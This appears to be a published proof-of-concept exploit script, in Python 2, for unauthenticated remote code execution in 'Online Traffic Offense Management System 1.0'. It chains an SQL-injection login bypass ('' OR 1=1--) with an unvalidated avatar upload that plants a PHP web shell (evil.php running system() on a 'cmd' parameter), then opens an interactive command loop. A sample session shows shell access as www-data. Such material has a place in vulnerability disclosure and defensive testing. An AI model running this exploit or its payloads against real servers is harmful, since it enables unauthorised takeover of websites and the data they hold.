# Exploit Title: Online Traffic Offense Management System 1.0 - Remote Code Execution (RCE) (Unauthenticated)
# Date: 20-08-2021
# Exploit Author: Halit AKAYDIN (hLtAkydn)
# Vendor Homepage: https://www.sourcecodester.com
# Software Link: https://www.sourcecodester.com/php/14909/online-traffic-offense-management-system-php-free-source-code.html
# Version: V1
# Category: Webapps
# Tested on: Linux/Windows

# Online Traffic Offense Management System
# contains a file upload vulnerability that allows for remote
# code execution against the target.  This exploit requires
# the user to be authenticated, but a SQL injection in the login form
# allows the authentication controls to be bypassed
# File uploaded from "/admin/?page=user" has no validation check
# and the directory it is placed in allows for execution of PHP code.


"""
(hltakydn@SpaceSec)-[~/Exploits-db/traffic_offense]
$ python2 exploit.py

Example: http://example.com

Url: http://trafficoffense.com

[?] Check Adress

[+] Bypass Login

[+] Upload Shell

[+] Exploit Done!

$ whoami
www-data

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ pwd
/var/www/html/uploads

$

"""



#!/usr/bin/env python2
import requests
import time
from bs4 import BeautifulSoup

print ("\nExample: http://example.com\n")

url = raw_input("Url: ")
payload_name = "evil.php"
payload_file = "<?php if(isset($_GET['cmd'])){ echo '<pre>'; $cmd = ($_GET['cmd']); system($cmd); echo '</pre>'; die; } ?>"

if url.startswith(('http://', 'https://')):
    print "Check Url ...\n"
else:
    print "\n[?] Check Adress\n"
    url = "http://" + url

try:
    response = requests.get(url)
except requests.ConnectionError as exception:
    print("[-] Address not reachable")
    sys.exit(1)

session = requests.session()

request_url = url + "/classes/Login.php?f=login"
post_data = {"username": "'' OR 1=1-- '", "password": "'' OR 1=1-- '"}
bypass_user = session.post(request_url, data=post_data)


if bypass_user.text == '{"status":"success"}':
    print ("[+] Bypass Login\n")
    cookies = session.cookies.get_dict()
    req = session.get(url + "/admin/?page=user")
    parser = BeautifulSoup(req.text, 'html.parser')
    userid = parser.find('input', {'name':'id'}).get("value")
    firstname = parser.find('input', {'id':'firstname'}).get("value")
    lastname = parser.find('input', {'id':'lastname'}).get("value")
    username = parser.find('input', {'id':'username'}).get("value")

    request_url = url + "/classes/Users.php?f=save"
    headers = {"sec-ch-ua": "\";Not A Brand\";v=\"99\", \"Chromium\";v=\"88\"", "Accept": "*/*", "X-Requested-With": "XMLHttpRequest", "sec-ch-ua-mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryxGKa5dhQCRwOodsq", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
    data = "------WebKitFormBoundaryxGKa5dhQCRwOodsq\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n"+ userid +"\r\n------WebKitFormBoundaryxGKa5dhQCRwOodsq\r\nContent-Disposition: form-data; name=\"firstname\"\r\n\r\n"+ firstname +"\r\n------WebKitFormBoundaryxGKa5dhQCRwOodsq\r\nContent-Disposition: form-data; name=\"lastname\"\r\n\r\n"+ lastname +"\r\n------WebKitFormBoundaryxGKa5dhQCRwOodsq\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\n"+ username +"\r\n------WebKitFormBoundaryxGKa5dhQCRwOodsq\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n\r\n------WebKitFormBoundaryxGKa5dhQCRwOodsq\r\nContent-Disposition: form-data; name=\"img\"; filename=\""+ payload_name +"\"\r\nContent-Type: application/x-php\r\n\r\n" + payload_file +"\n\r\n------WebKitFormBoundaryxGKa5dhQCRwOodsq--\r\n"
    upload = session.post(request_url, headers=headers, cookies=cookies, data=data)
    time.sleep(2)

    if upload.text == "1":
        print ("[+] Upload Shell\n")
        time.sleep(2)
        req = session.get(url + "/admin/?page=user")
        parser = BeautifulSoup(req.text, 'html.parser')
        find_shell = parser.find('img', {'id':'cimg'})
        print ("[+] Exploit Done!\n")

        while True:
            cmd = raw_input("$ ")
            headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36'}
            request = requests.post(find_shell.get("src") + "?cmd=" + cmd, data={'key':'value'}, headers=headers)
            print request.text.replace("<pre>" ,"").replace("</pre>", "")
            time.sleep(1)

    elif upload.text == "2":
        print ("[-] Try the manual method")
        request_url = url + "/classes/Login.php?f=logout"
        cookies = session.cookies.get_dict()
        headers = {"sec-ch-ua": "\";Not A Brand\";v=\"99\", \"Chromium\";v=\"88\"", "sec-ch-ua-mobile": "?0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
        session.get(request_url, headers=headers, cookies=cookies)
    else:
        print("[!]An unknown error")

else:
    print ("[-] Failed to bypass login panel")